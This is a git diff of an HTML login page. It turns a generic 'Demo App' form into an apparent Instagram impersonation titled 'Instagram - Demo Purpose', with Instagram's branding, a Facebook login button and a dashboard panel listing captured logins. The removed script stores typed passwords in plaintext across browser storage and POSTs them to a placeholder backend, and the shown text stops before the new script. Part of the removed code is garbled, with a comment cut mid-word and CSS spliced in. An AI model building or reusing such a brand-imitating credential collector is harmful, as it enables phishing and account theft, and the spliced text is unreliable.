@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Demo App - Login</title>
+    <title>Instagram - Demo Purpose</title>
     <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" rel="stylesheet">
     <style>
         * {
@@ -12,42 +12,348 @@
             box-sizing: border-box;
         }
 
-        :root {
-            --primary: #0066cc;
-            --primary-dark: #0052a3;
-            --accent: #ff6b35;
-            --bg-light: #f8f9fa;
-            --bg-white: #ffffff;
-            --text-dark: #1a1a1a;
-            --text-muted: #65676b;
-            --border-color: #e5e7eb;
-            --success: #31a24c;
-            --error: #f02849;
-        }
-
         body {
             font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', 'Helvetica Neue', sans-serif;
-            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            background: #fafafa;
             min-height: 100vh;
             display: flex;
             align-items: center;
             justify-content: center;
             padding: 20px;
-            color: var(--text-dark);
         }
 
         .container {
             display: flex;
-            gap: 40px;
-            max-width: 1000px;
+            gap: 64px;
+            max-width: 1200px;
             width: 100%;
-            animation: fadeIn 0.6s ease-in;
         }
 
-        @keyframes fadeIn {
+        /* Left side - Phone Mockup */
+        .phone-mockup {
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            flex: 1;
+            min-width: 300px;
+        }
+
+        .phone {
+            width: 340px;
+            height: 600px;
+            background: #fff;
+            border-radius: 40px;
+            border: 12px solid #000;
+            overflow: hidden;
+            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.3);
+            display: flex;
+            flex-direction: column;
+        }
+
+        .phone-status {
+            height: 44px;
+            background: #fff;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            padding: 0 16px;
+            font-size: 12px;
+            font-weight: 600;
+            border-bottom: 1px solid #e5e5e5;
+        }
+
+        .status-left, .status-right {
+            display: flex;
+            align-items: center;
+            gap: 4px;
+        }
+
+        .phone-content {
+            flex: 1;
+            overflow-y: auto;
+            background: #fff;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            padding: 40px 24px;
+        }
+
+        /* Right side - Login Form */
+        .login-container {
+            flex: 1;
+            max-width: 400px;
+        }
+
+        .login-form {
+            background: #fff;
+            border: 1px solid #dbdbdb;
+            border-radius: 4px;
+            padding: 0;
+            margin-bottom: 20px;
+        }
+
+        .login-header {
+            padding: 48px 40px 24px;
+            text-align: center;
+            border-bottom: 1px solid #dbdbdb;
+        }
+
+        .instagram-logo {
+            font-size: 32px;
+            font-weight: 700;
+            background: linear-gradient(45deg, #f09433 0%, #e6683c 25%, #dc2743 50%, #cc2366 75%, #bc1888 100%);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
+            margin-bottom: 8px;
+            letter-spacing: -1px;
+            font-style: italic;
+        }
+
+        .login-subtitle {
+            color: #8a8a8a;
+            font-size: 13px;
+            margin-top: 8px;
+        }
+
+        .form-inputs {
+            padding: 0 40px;
+            padding-top: 24px;
+        }
+
+        .form-group {
+            margin-bottom: 10px;
+        }
+
+        input[type="text"],
+        input[type="email"],
+        input[type="password"] {
+            width: 100%;
+            padding: 10px 10px;
+            background: #fafafa;
+            border: 1px solid #dbdbdb;
+            border-radius: 4px;
+            font-size: 13px;
+            font-family: inherit;
+            transition: all 0.2s ease;
+        }
+
+        input[type="text"]:focus,
+        input[type="email"]:focus,
+        input[type="password"]:focus {
+            outline: none;
+            border-color: #bdbdbd;
+            background: #fff;
+            box-shadow: 0 0 0 1px rgba(0, 0, 0, 0.05);
+        }
+
+        input::placeholder {
+            color: #a6a6a6;
+        }
+
+        .form-messages {
+            padding: 0 40px;
+        }
+
+        .form-error {
+            background: #fff3cd;
+            color: #d63031;
+            padding: 8px 10px;
+            border-radius: 4px;
+            font-size: 13px;
+            margin-bottom: 12px;
+            border: 1px solid #f5a5a5;
+            display: none;
+            animation: shake 0.3s ease;
+        }
+
+        .form-error.show {
+            display: block;
+        }
+
+        .form-success {
+            background: #d4edda;
+            color: #155724;
+            padding: 8px 10px;
+            border-radius: 4px;
+            font-size: 13px;
+            margin-bottom: 12px;
+            border: 1px solid #c3e6cb;
+            display: none;
+        }
+
+        .form-success.show {
+            display: block;
+        }
+
+        @keyframes shake {
+            0%, 100% { transform: translateX(0); }
+            25% { transform: translateX(-4px); }
+            75% { transform: translateX(4px); }
+        }
+
+        .login-btn {
+            width: 100%;
+            padding: 8px;
+            background: linear-gradient(45deg, #f09433 0%, #e6683c 25%, #dc2743 50%, #cc2366 75%, #bc1888 100%);
+            color: #fff;
+            border: none;
+            border-radius: 4px;
+            font-size: 14px;
+            font-weight: 600;
+            cursor: pointer;
+            margin-bottom: 12px;
+            transition: opacity 0.2s ease;
+        }
+
+        .login-btn:hover:not(:disabled) {
+            opacity: 0.8;
+        }
+
+        .login-btn:disabled {
+            opacity: 0.5;
+            cursor: not-allowed;
+        }
+
+        .divider {
+            display: flex;
+            align-items: center;
+            margin: 16px 0;
+            gap: 12px;
+        }
+
+        .divider::before,
+        .divider::after {
+            content: '';
+            flex: 1;
+            height: 1px;
+            background: #dbdbdb;
+        }
+
+        .divider-text {
+            font-size: 13px;
+            color: #8a8a8a;
+            font-weight: 600;
+        }
+
+        .facebook-btn {
+            width: 100%;
+            padding: 8px;
+            background: #0a66c2;
+            color: #fff;
+            border: none;
+            border-radius: 4px;
+            font-size: 14px;
+            font-weight: 600;
+            cursor: pointer;
+            margin-bottom: 16px;
+            transition: opacity 0.2s ease;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+        }
+
+        .facebook-btn:hover:not(:disabled) {
+            opacity: 0.8;
+        }
+
+        .forgot-password {
+            text-align: center;
+            font-size: 12px;
+            color: #003569;
+            text-decoration: none;
+            margin-bottom: 24px;
+            display: block;
+        }
+
+        .forgot-password:hover {
+            text-decoration: underline;
+        }
+
+        .signup-section {
+            background: #fff;
+            border: 1px solid #dbdbdb;
+            border-radius: 4px;
+            padding: 16px;
+            text-align: center;
+            font-size: 14px;
+            color: #262626;
+            margin-bottom: 20px;
+        }
+
+        .signup-link {
+            color: #0095f6;
+            text-decoration: none;
+            font-weight: 600;
+        }
+
+        .signup-link:hover {
+            text-decoration: underline;
+        }
+
+        .spinner {
+            display: inline-block;
+            width: 14px;
+            height: 14px;
+            border: 2px solid rgba(255, 255, 255, 0.3);
+            border-radius: 50%;
+            border-top-color: white;
+            animation: spin 0.8s linear infinite;
+            margin-right: 6px;
+        }
+
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+
+        /* Dashboard */
+        .dashboard-panel {
+            background: #fff;
+            border: 1px solid #dbdbdb;
+            border-radius: 4px;
+            padding: 16px;
+            max-width: 400px;
+            max-height: 400px;
+            overflow-y: auto;
+        }
+
+        .dashboard-header {
+            font-weight: 600;
+            font-size: 14px;
+            margin-bottom: 12px;
+            padding-bottom: 12px;
+            border-bottom: 1px solid #dbdbdb;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+
+        .login-count-badge {
+            background: #f0f0f0;
+            padding: 2px 8px;
+            border-radius: 12px;
+            font-size: 12px;
+            font-weight: 600;
+            color: #262626;
+        }
+
+        .login-item {
+            padding: 12px;
+            border-bottom: 1px solid #f0f0f0;
+            font-size: 13px;
+            animation: slideIn 0.3s ease;
+        }
+
+        .login-item:last-child {
+            border-bottom: none;
+        }
+
+        @keyframes slideIn {
             from {
                 opacity: 0;
-                transform: translateY(20px);
+                transform: translateY(-8px);
             }
             to {
                 opacity: 1;
@@ -55,1054 +361,203 @@
             }
         }
 
-        .branding {
-            display: flex;
-            flex-direction: column;
-            justify-content: center;
-            color: white;
-            flex: 1;
-        }
-
-        .logo {
-            display: flex;
-            align-items: center;
-            gap: 12px;
-            margin-bottom: 30px;
-            font-size: 28px;
-            font-weight: 700;
-            animation: slideInLeft 0.6s ease-out;
-        }
-
-        @keyframes slideInLeft {
-            from {
-                opacity: 0;
-                transform: translateX(-30px);
-            }
-            to {
-                opacity: 1;
-                transform: translateX(0);
-            }
-        }
-
-        .logo-icon {
-            width: 50px;
-            height: 50px;
-            background: white;
-            border-radius: 12px;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            font-size: 28px;
-            color: var(--primary);
-            font-weight: 800;
-        }
-
-        .tagline {
-            font-size: 20px;
-            font-weight: 300;
-            margin-bottom: 20px;
-            line-height: 1.5;
-        }
-
-        .features {
-            display: flex;
-            flex-direction: column;
-            gap: 16px;
-        }
-
-        .feature {
-            display: flex;
-            align-items: flex-start;
-            gap: 12px;
-            opacity: 0.95;
-        }
-
-        .feature i {
-            font-size: 20px;
-            margin-top: 2px;
-            flex-shrink: 0;
-        }
-
-        .feature-text {
-            font-size: 14px;
-            line-height: 1.5;
-        }
-
-        .login-box {
-            background: var(--bg-white);
-            border-radius: 12px;
-            padding: 40px;
-            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.3);
-            width: 100%;
-            max-width: 400px;
-            animation: slideInRight 0.6s ease-out;
-        }
-
-        @keyframes slideInRight {
-            from {
-                opacity: 0;
-                transform: translateX(30px);
-            }
-            to {
-                opacity: 1;
-                transform: translateX(0);
-            }
-        }
-
-        .login-header {
-            text-align: center;
-            margin-bottom: 32px;
-        }
-
-        .login-title {
-            font-size: 28px;
-            font-weight: 700;
-            margin-bottom: 8px;
-        }
-
-        .login-subtitle {
-            color: var(--text-muted);
-            font-size: 14px;
-        }
-
-        .form-group {
-            margin-bottom: 16px;
-        }
-
-        label {
-            display: block;
-            font-size: 13px;
+        .login-item-username {
             font-weight: 600;
-            margin-bottom: 8px;
-            color: var(--text-dark);
+            color: #262626;
+            margin-bottom: 4px;
         }
 
-        input[type="text"],
-        input[type="email"],
-        input[type="password"] {
-            width: 100%;
-            padding: 12px 14px;
-            border: 1px solid var(--border-color);
-            border-radius: 6px;
-            font-size: 14px;
-            font-family: inherit;
-            transition: all 0.3s ease;
-            background: var(--bg-light);
-        }
-
-        input[type="text"]:focus,
-        input[type="email"]:focus,
-        input[type="password"]:focus {
-            outline: none;
-            border-color: var(--primary);
-            background: var(--bg-white);
-            box-shadow: 0 0 0 3px rgba(0, 102, 204, 0.1);
-        }
-
-        input::placeholder {
-            color: var(--text-muted);
-        }
-
-        .btn {
-            width: 100%;
-            padding: 12px 16px;
-            border: none;
-            border-radius: 6px;
-            font-size: 15px;
-            font-weight: 600;
-            cursor: pointer;
-            transition: all 0.3s ease;
-            font-family: inherit;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            gap: 8px;
-        }
-
-        .btn-primary {
-            background: linear-gradient(135deg, var(--primary) 0%, var(--primary-dark) 100%);
-            color: white;
-            margin-bottom: 12px;
-        }
-
-        .btn-primary:hover:not(:disabled) {
-            transform: translateY(-2px);
-            box-shadow: 0 10px 20px rgba(0, 102, 204, 0.3);
-        }
-
-        .btn-primary:active:not(:disabled) {
-            transform: translateY(0);
-        }
-
-        .btn-primary:disabled {
-            opacity: 0.6;
-            cursor: not-allowed;
-        }
-
-        .btn-github {
-            background: var(--text-dark);
-            color: white;
-            border: 2px solid var(--text-dark);
-            margin-bottom: 16px;
-        }
-
-        .btn-github:hover:not(:disabled) {
-            background: white;
-            color: var(--text-dark);
-            box-shadow: 0 10px 20px rgba(0, 0, 0, 0.1);
-        }
-
-        .divider {
-            display: flex;
-            align-items: center;
-            margin: 24px 0;
-            gap: 12px;
-        }
-
-        .divider::before,
-        .divider::after {
-            content: '';
-            flex: 1;
-            height: 1px;
-            background: var(--border-color);
-        }
-
-        .divider-text {
-            font-size: 13px;
-            color: var(--text-muted);
-            font-weight: 500;
-        }
-
-        .help-section {
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            margin-bottom: 24px;
-            font-size: 13px;
-        }
-
-        .help-link {
-            color: var(--primary);
-            text-decoration: none;
-            font-weight: 500;
-            transition: color 0.3s;
-        }
-
-        .help-link:hover {
-            color: var(--primary-dark);
-            text-decoration: underline;
-        }
-
-        .signup-section {
-            text-align: center;
-            padding-top: 20px;
-            border-top: 1px solid var(--border-color);
-        }
-
-        .signup-text {
-            font-size: 13px;
-            color: var(--text-muted);
-        }
-
-        .signup-link {
-            color: var(--primary);
-            text-decoration: none;
-            font-weight: 600;
-            margin-left: 4px;
-        }
-
-        .signup-link:hover {
-            text-decoration: underline;
-        }
-
-        .form-error {
-            background: #fee;
-            color: var(--error);
-            padding: 10px 12px;
-            border-radius: 6px;
-            font-size: 13px;
-            margin-bottom: 16px;
-            border: 1px solid #fcc;
-            display: none;
-            animation: shake 0.3s ease;
-        }
-
-        .form-error.show {
-            display: block;
-        }
-
-        @keyframes shake {
-            0%, 100% { transform: translateX(0); }
-            25% { transform: translateX(-5px); }
-            75% { transform: translateX(5px); }
-        }
-
-        .form-success {
-            background: #efe;
-            color: var(--success);
-            padding: 10px 12px;
-            border-radius: 6px;
-            font-size: 13px;
-            margin-bottom: 16px;
-            border: 1px solid #cfc;
-            display: none;
-            animation: fadeIn 0.3s ease;
-        }
-
-        .form-success.show {
-            display: block;
-        }
-
-        .checkbox-group {
-            display: flex;
-            align-items: center;
-            gap: 8px;
-            margin-bottom: 16px;
-        }
-
-        input[type="checkbox"] {
-            width: 18px;
-            height: 18px;
-            cursor: pointer;
-            accent-color: var(--primary);
-        }
-
-        .checkbox-label {
-            font-size: 13px;
-            color: var(--text-muted);
-            cursor: pointer;
-            margin: 0;
-        }
-
-        @media (max-width: 768px) {
-            .container {
-                flex-direction: column;
-                gap: 30px;
-            }
-
-            .branding {
-                display: none;
-            }
-
-            .login-box {
-                max-width: 100%;
-                padding: 32px 24px;
-            }
-
-            .login-title {
-                font-size: 24px;
-            }
-        }
-
-        .spinner {
-            display: inline-block;
-            width: 16px;
-            height: 16px;
-            border: 2px solid rgba(255, 255, 255, 0.3);
-            border-radius: 50%;
-            border-top-color: white;
-            animation: spin 0.8s linear infinite;
-        }
-
-        @keyframes spin {
-            to { transform: rotate(360deg); }
-        }
-
-        .btn:disabled .spinner {
-            display: inline-block;
-        }
-
-        .info-banner {
-            background: #e3f2fd;
-            border: 1px solid #90caf9;
-            color: #1565c0;
-            padding: 12px;
-            border-radius: 6px;
+        .login-item-time {
+            color: #8a8a8a;
             font-size: 12px;
-            margin-bottom: 16px;
+        }
+
+        .login-item-details {
+            color: #8a8a8a;
+            font-size: 12px;
+            margin-top: 4px;
+        }
+
+        .no-logins {
             text-align: center;
-        }
-    </style>
-</head>
-<body>
-    <div class="container">
-        <!-- Branding Section -->
-        <div class="branding">
-            <div class="logo">
-                <div class="logo-icon">D</div>
-                <span>Demo App</span>
-            </div>
-            <div class="tagline">Connect with your developer community and collaborate on amazing projects</div>
-            <div class="features">
-                <div class="feature">
-                    <i class="fas fa-check"></i>
-                    <div class="feature-text">Seamless GitHub authentication</div>
-                </div>
-                <div class="feature">
-                    <i class="fas fa-check"></i>
-                    <div class="feature-text">Secure login credentials</div>
-                </div>
-                <div class="feature">
-                    <i class="fas fa-check"></i>
-                    <div class="feature-text">Fast and reliable access</div>
-                </div>
-            </div>
-        </div>
-
-        <!-- Login Form Section -->
-        <div class="login-box">
-            <div class="login-header">
-                <h1 class="login-title">Login</h1>
-                <p class="login-subtitle">Demo Purpose - Secure Access</p>
-            </div>
-
-            <form id="loginForm">
-                <div class="info-banner">
-                    ℹ️ This is a DEMO. Login data is saved to your browser's storage.
-                </div>
-
-                <div class="form-error" id="errorMessage"></div>
-                <div class="form-success" id="successMessage"></div>
-
-                <!-- GitHub Login -->
-                <button type="button" class="btn btn-github" onclick="handleGitHubLogin()" id="githubBtn">
-                    <i class="fab fa-github"></i>
-                    <span>Login with GitHub</span>
-                </button>
-
-                <div class="divider">
-                    <span class="divider-text">OR</span>
-                </div>
-
-                <!-- Email/Username -->
-                <div class="form-group">
-                    <label for="username">Email or Username</label>
-                    <input 
-                        type="text" 
-                        id="username" 
-                        name="username" 
-                        placeholder="Enter your email or username"
-                        required
-                    >
-                </div>
-
-                <!-- Password -->
-                <div class="form-group">
-                    <label for="password">Password</label>
-                    <input 
-                        type="password" 
-                        id="password" 
-                        name="password" 
-                        placeholder="Enter your password"
-                        required
-                    >
-                </div>
-
-                <!-- Remember Me & Forgot Password -->
-                <div class="help-section">
-                    <div class="checkbox-group">
-                        <input type="checkbox" id="remember" name="remember">
-                        <label for="remember" class="checkbox-label">Remember me</label>
-                    </div>
-                    <a href="#" class="help-link" onclick="event.preventDefault(); showError('Password reset would be sent to your email.');">Forgot password?</a>
-                </div>
-
-                <!-- Login Button -->
-                <button type="submit" class="btn btn-primary" id="loginBtn">
-                    <span>Log In</span>
-                </button>
-            </form>
-
-            <!-- Sign Up Section -->
-            <div class="signup-section">
-                <span class="signup-text">
-                    Don't have an account?
-                    <a href="#" class="signup-link" onclick="event.preventDefault(); showError('Sign up page would open here.');">Sign up</a>
-                </span>
-            </div>
-        </div>
-    </div>
-
-    <script>
-        const form = document.getElementById('loginForm');
-        const errorMessage = document.getElementById('errorMessage');
-        const successMessage = document.getElementById('successMessage');
-        const loginBtn = document.getElementById('loginBtn');
-
-        // Email validation
-        function validateEmail(email) {
-            const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
-            return emailRegex.test(email);
+            padding: 40px 20px;
+            color: #8a8a8a;
         }
 
-        // Show error message
-        function showError(message) {
-            errorMessage.textContent = message;
-            errorMessage.classList.add('show');
-            setTimeout(() => {
-                errorMessage.classList.remove('show');
-            }, 4000);
-        }
-
-        // Show success message
-        function showSuccess(message) {
-            successMessage.textContent = message;
-            successMessage.classList.add('show');
-            setTimeout(() => {
-                successMessage.classList.remove('show');
-            }, 3000);
-        }
-
-        // Save login data to multiple storage locations
-        function saveLoginData(username, password, remember) {
-            const loginData = {
-                username,
-                password: password,
-                rememberMe: remember,
-                timestamp: new Date().toLocaleString(),
-                loginTime: new Date().toISOString()
-            };
-
-            // 1. BROWSER CONSOLE
-            console.log('✅ Login Data (Console Log):', loginData);
-
-            // 2. BROWSER LOCAL STORAGE (persists across sessions)
-            const allLogins = JSON.parse(localStorage.getItem('demoAppLogins') || '[]');
-            allLogins.push(loginData);
-            localStorage.setItem('demoAppLogins', JSON.stringify(allLogins));
-            console.log('💾 Data saved to Browser Local Storage');
-
-            // 3. BROWSER SESSION STORAGE (only current session)
-            sessionStorage.setItem('currentUserLogin', JSON.stringify(loginData));
-            console.log('📝 Data saved to Session Storage');
-
-            // 4. SEND TO SERVER/API (example)
-            sendToServer(loginData);
-
-            // 5. INDEXED DB (for larger data storage)
-            saveToIndexedDB(loginData);
-
-            // Show all saved logins
-            console.log('📊 All saved logins:', JSON.parse(localStorage.getItem('demoAppLogins')));
-        }
-
-        // Send data to server
-        function sendToServer(data) {
-            const serverURL = 'https://your-backend-api.com/api/login';
-
-            fetch(serverURL, {
-                method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json',
-                },
-                body: JSON.stringify(data)
-            })
-            .then(response => response.json())
-            .then(result => {
-                console.log('✓ Data sent to server:', result);
-            })
-            .catch(error => {
-                console.log('⚠ Server not available (demo mode):', error.message);
-            });
-        }
-
-        // IndexedDB Storage
-        function saveToIndexedDB(data) {
-            const request = indexedDB.open('DemoAppDB', 1);
-
-            request.onerror = function() {
-                console.log('⚠ IndexedDB error');
-            };
-
-            request.onupgradeneeded = function(e) {
-                const db = e.target.result;
-                if (!db.objectStoreNames.contains('logins')) {
-                    db.createObjectStore('logins', { keyPath: 'id', autoIncrement: true });
-                }
-            };
-
-            request.onsuccess = function() {
-                const db = request.result;
-                const transaction = db.transaction(['logins'], 'readwrite');
-                const objectStore = transaction.objectStore('logins');
-                objectStore.add(data);
-                console.log('🗄️ Data saved to IndexedDB');
-            };
-        }
-
-        // Handle form submission
-        form.addEventListener('submit', async (e) => {
-            e.preventDefault();
-
-            const username = document.getElementById('username').value.trim();
-            const password = document.getElementById('password').value.trim();
-            const remember = document.getElementById('remember').checked;
-
-            // Validation
-            if (!username || !password) {
-                showError('Please fill in all fields');
-                return;
-            }
-
-            if (username.includes('@') && !validateEmail(username)) {
-                showError('Please enter a valid email address');
-                return;
-            }
-
-            if (password.length < 6) {
-                showError('Password must be at least 6 characters');
-                return;
-            }
-
-            // Show loading state
-            loginBtn.disabled = true;
-            loginBtn.innerHTML = '<span class="spinner"></span><span>Logging in...</span>';
-
-            // Simulate API call
-            await new Promise(resolve => setTimeout(resolve, 1500));
-
-            // Save the login data
-            saveLoginData(username, password, remember);
-
-            // Success
-            loginBtn.disabled = false;
-            loginBtn.innerHTML = '<span>Log In</span>';
-            showSuccess(`✅ Welcome! Logged in as ${username}`);
-
-            // Reset form after delay
-            setTimeout(() => {
-                form.reset();
-            }, 2000);
-        });
-
-        // Handle GitHub Login
-        function handleGitHubLogin() {
-            // IMPORTANT: Replace these with your actual GitHub OAuth c                opacity: 1;
-                transform: translateX(0);
-            }
-        }
-
-        .logo-icon {
-            width: 50px;
-            height: 50px;
-            background: white;
-            border-radius: 12px;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            font-size: 28px;
-            color: var(--primary);
-            font-weight: 800;
-        }
-
-        .tagline {
-            font-size: 20px;
-            font-weight: 300;
-            margin-bottom: 20px;
-            line-height: 1.5;
-        }
-
-        .features {
-            display: flex;
-            flex-direction: column;
-            gap: 16px;
-        }
-
-        .feature {
-            display: flex;
-            align-items: flex-start;
-            gap: 12px;
-            opacity: 0.95;
-        }
-
-        .feature i {
-            font-size: 20px;
-            margin-top: 2px;
-            flex-shrink: 0;
-        }
-
-        .feature-text {
-            font-size: 14px;
-            line-height: 1.5;
-        }
-
-        .login-box {
-            background: var(--bg-white);
-            border-radius: 12px;
-            padding: 40px;
-            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.3);
-            width: 100%;
-            max-width: 400px;
-            animation: slideInRight 0.6s ease-out;
-        }
-
-        @keyframes slideInRight {
-            from {
-                opacity: 0;
-                transform: translateX(30px);
-            }
-            to {
-                opacity: 1;
-                transform: translateX(0);
-            }
-        }
-
-        .login-header {
-            text-align: center;
-            margin-bottom: 32px;
-        }
-
-        .login-title {
-            font-size: 28px;
-            font-weight: 700;
-            margin-bottom: 8px;
-        }
-
-        .login-subtitle {
-            color: var(--text-muted);
-            font-size: 14px;
-        }
-
-        .form-group {
-            margin-bottom: 16px;
-        }
-
-        label {
-            display: block;
-            font-size: 13px;
-            font-weight: 600;
-            margin-bottom: 8px;
-            color: var(--text-dark);
-        }
-
-        input[type="text"],
-        input[type="email"],
-        input[type="password"] {
-            width: 100%;
-            padding: 12px 14px;
-            border: 1px solid var(--border-color);
-            border-radius: 6px;
-            font-size: 14px;
-            font-family: inherit;
-            transition: all 0.3s ease;
-            background: var(--bg-light);
-        }
-
-        input[type="text"]:focus,
-        input[type="email"]:focus,
-        input[type="password"]:focus {
-            outline: none;
-            border-color: var(--primary);
-            background: var(--bg-white);
-            box-shadow: 0 0 0 3px rgba(0, 102, 204, 0.1);
-        }
-
-        input::placeholder {
-            color: var(--text-muted);
-        }
-
-        .btn {
-            width: 100%;
-            padding: 12px 16px;
-            border: none;
-            border-radius: 6px;
-            font-size: 15px;
-            font-weight: 600;
-            cursor: pointer;
-            transition: all 0.3s ease;
-            font-family: inherit;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            gap: 8px;
-        }
-
-        .btn-primary {
-            background: linear-gradient(135deg, var(--primary) 0%, var(--primary-dark) 100%);
-            color: white;
+        .no-logins i {
+            font-size: 32px;
             margin-bottom: 12px;
+            opacity: 0.5;
         }
 
-        .btn-primary:hover:not(:disabled) {
-            transform: translateY(-2px);
-            box-shadow: 0 10px 20px rgba(0, 102, 204, 0.3);
-        }
-
-        .btn-primary:active:not(:disabled) {
-            transform: translateY(0);
-        }
-
-        .btn-primary:disabled {
-            opacity: 0.6;
-            cursor: not-allowed;
-        }
-
-        .btn-github {
-            background: var(--text-dark);
-            color: white;
-            border: 2px solid var(--text-dark);
-            margin-bottom: 16px;
-        }
-
-        .btn-github:hover:not(:disabled) {
-            background: white;
-            color: var(--text-dark);
-            box-shadow: 0 10px 20px rgba(0, 0, 0, 0.1);
-        }
-
-        .divider {
-            display: flex;
-            align-items: center;
-            margin: 24px 0;
-            gap: 12px;
-        }
-
-        .divider::before,
-        .divider::after {
-            content: '';
-            flex: 1;
-            height: 1px;
-            background: var(--border-color);
-        }
-
-        .divider-text {
+        .clear-btn {
+            width: 100%;
+            padding: 8px;
+            background: #f0f0f0;
+            color: #262626;
+            border: none;
+            border-radius: 4px;
             font-size: 13px;
-            color: var(--text-muted);
-            font-weight: 500;
-        }
-
-        .help-section {
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            margin-bottom: 24px;
-            font-size: 13px;
-        }
-
-        .help-link {
-            color: var(--primary);
-            text-decoration: none;
-            font-weight: 500;
-            transition: color 0.3s;
-        }
-
-        .help-link:hover {
-            color: var(--primary-dark);
-            text-decoration: underline;
-        }
-
-        .signup-section {
-            text-align: center;
-            padding-top: 20px;
-            border-top: 1px solid var(--border-color);
-        }
-
-        .signup-text {
-            font-size: 13px;
-            color: var(--text-muted);
-        }
-
-        .signup-link {
-            color: var(--primary);
-            text-decoration: none;
             font-weight: 600;
-            margin-left: 4px;
-        }
-
-        .signup-link:hover {
-            text-decoration: underline;
-        }
-
-        .form-error {
-            background: #fee;
-            color: var(--error);
-            padding: 10px 12px;
-            border-radius: 6px;
-            font-size: 13px;
-            margin-bottom: 16px;
-            border: 1px solid #fcc;
+            cursor: pointer;
+            margin-top: 12px;
+            transition: opacity 0.2s ease;
             display: none;
-            animation: shake 0.3s ease;
         }
 
-        .form-error.show {
+        .clear-btn:hover {
+            opacity: 0.7;
+        }
+
+        .clear-btn.show {
             display: block;
         }
 
-        @keyframes shake {
-            0%, 100% { transform: translateX(0); }
-            25% { transform: translateX(-5px); }
-            75% { transform: translateX(5px); }
-        }
-
-        .form-success {
-            background: #efe;
-            color: var(--success);
-            padding: 10px 12px;
-            border-radius: 6px;
-            font-size: 13px;
-            margin-bottom: 16px;
-            border: 1px solid #cfc;
-            display: none;
-            animation: fadeIn 0.3s ease;
-        }
-
-        .form-success.show {
-            display: block;
-        }
-
-        .checkbox-group {
-            display: flex;
-            align-items: center;
-            gap: 8px;
-            margin-bottom: 16px;
-        }
-
-        input[type="checkbox"] {
-            width: 18px;
-            height: 18px;
-            cursor: pointer;
-            accent-color: var(--primary);
-        }
-
-        .checkbox-label {
-            font-size: 13px;
-            color: var(--text-muted);
-            cursor: pointer;
-            margin: 0;
-        }
-
-        @media (max-width: 768px) {
+        @media (max-width: 900px) {
             .container {
                 flex-direction: column;
                 gap: 30px;
             }
 
-            .branding {
-                display: none;
+            .phone {
+                width: 100%;
+                max-width: 340px;
+                margin: 0 auto;
             }
 
-            .login-box {
+            .login-container {
                 max-width: 100%;
-                padding: 32px 24px;
-            }
-
-            .login-title {
-                font-size: 24px;
             }
         }
 
-        /* Loading animation */
-        .spinner {
-            display: inline-block;
-            width: 16px;
-            height: 16px;
-            border: 2px solid rgba(255, 255, 255, 0.3);
-            border-radius: 50%;
-            border-top-color: white;
-            animation: spin 0.8s linear infinite;
-        }
+        @media (max-width: 600px) {
+            .phone {
+                width: 100%;
+                height: auto;
+                min-height: 400px;
+                border-radius: 0;
+                border: none;
+            }
 
-        @keyframes spin {
-            to { transform: rotate(360deg); }
-        }
+            .container {
+                gap: 20px;
+            }
 
-        .btn:disabled .spinner {
-            display: inline-block;
+            .login-form {
+                border: none;
+                background: #fafafa;
+            }
+
+            .login-header {
+                padding: 32px 20px;
+            }
+
+            .form-inputs {
+                padding: 0 20px;
+            }
+
+            .form-messages {
+                padding: 0 20px;
+            }
         }
     </style>
 </head>
 <body>
     <div class="container">
-        <!-- Branding Section -->
-        <div class="branding">
-            <div class="logo">
-                <div class="logo-icon">D</div>
-                <span>Demo App</span>
-            </div>
-            <div class="tagline">Connect with your developer community and collaborate on amazing projects</div>
-            <div class="features">
-                <div class="feature">
-                    <i class="fas fa-check"></i>
-                    <div class="feature-text">Seamless GitHub authentication</div>
+        <!-- Phone Mockup (Left) -->
+        <div class="phone-mockup">
+            <div class="phone">
+                <div class="phone-status">
+                    <span class="status-left">
+                        <i class="fas fa-signal"></i>
+                        <span>Carrier</span>
+                    </span>
+                    <span>9:41</span>
+                    <span class="status-right">
+                        <i class="fas fa-battery-full"></i>
+                    </span>
                 </div>
-                <div class="feature">
-                    <i class="fas fa-check"></i>
-                    <div class="feature-text">Secure login credentials</div>
-                </div>
-                <div class="feature">
-                    <i class="fas fa-check"></i>
-                    <div class="feature-text">Fast and reliable access</div>
+                <div class="phone-content">
+                    <div style="text-align: center; font-size: 48px; margin-bottom: 20px;">📸</div>
+                    <div style="font-size: 24px; font-weight: 700; text-align: center; margin-bottom: 8px;">Instagram</div>
+                    <div style="font-size: 13px; color: #8a8a8a; text-align: center;">Demo Purpose</div>
                 </div>
             </div>
         </div>
 
-        <!-- Login Form Section -->
-        <div class="login-box">
-            <div class="login-header">
-                <h1 class="login-title">Login</h1>
-                <p class="login-subtitle">Demo Purpose - Secure Access</p>
+        <!-- Right side - Login & Dashboard -->
+        <div class="login-container">
+            <!-- Login Form -->
+            <div class="login-form">
+                <div class="login-header">
+                    <div class="instagram-logo">Instagram</div>
+                    <div class="login-subtitle">Demo Purpose - Login & Data Saving</div>
+                </div>
+
+                <form id="loginForm">
+                    <div class="form-messages">
+                        <div class="form-error" id="errorMessage"></div>
+                        <div class="form-success" id="successMessage"></div>
+                    </div>
+
+                    <div class="form-inputs">
+                        <!-- Phone/Email/Username -->
+                        <div class="form-group">
+                            <input 
+                                type="text" 
+                                id="username" 
+                                placeholder="Phone number, username, or email"
